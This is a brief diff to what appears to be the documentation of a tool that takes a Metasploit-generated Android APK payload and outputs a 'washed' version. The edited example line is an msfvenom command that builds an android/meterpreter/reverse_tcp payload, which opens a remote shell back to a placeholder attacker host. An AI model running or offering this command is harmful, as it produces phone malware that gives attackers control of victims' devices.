@@ -18,7 +18,7 @@ apktool \<payload>.apk<br>
 <br>
 <b>Input:</b><br>
 This script takes a msfgenerated payload as input.<br>
-Ex: msfvenom -p android/meterpreter/reverse_tcp LHOST=<IP> LPORT<PORT> -o \<payload>.apk<br>
+Ex: msfvenom -p android/meterpreter/reverse_tcp LHOST=\<IP> LPORT=\<PORT> -o \<payload>.apk<br>
 <br>
 <b>Output:</b><br>
 washed_\<payload>.apk<br>
